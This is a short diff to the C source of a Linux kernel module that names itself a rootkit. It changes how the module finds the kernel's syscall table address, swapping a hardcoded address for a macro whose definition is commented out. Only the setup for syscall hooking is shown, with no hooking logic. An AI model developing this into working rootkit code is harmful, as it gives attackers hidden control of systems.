@@ -2,7 +2,9 @@
 #include <linux/highmem.h>
 #include <asm/unistd.h>
 
-#define ROOTKIT_SYSCALL_TABLE_ADDR (0xffffffff81800180)
+//#define ROOTKIT_SYSCALL_TABLE 0xffffffff818001c0
+#define ROOTKIT_SYSCALL_TABLE_ADDR (ROOTKIT_SYSCALL_TABLE)
+
 
 unsigned long *sys_call_table = (void *)ROOTKIT_SYSCALL_TABLE_ADDR;
 
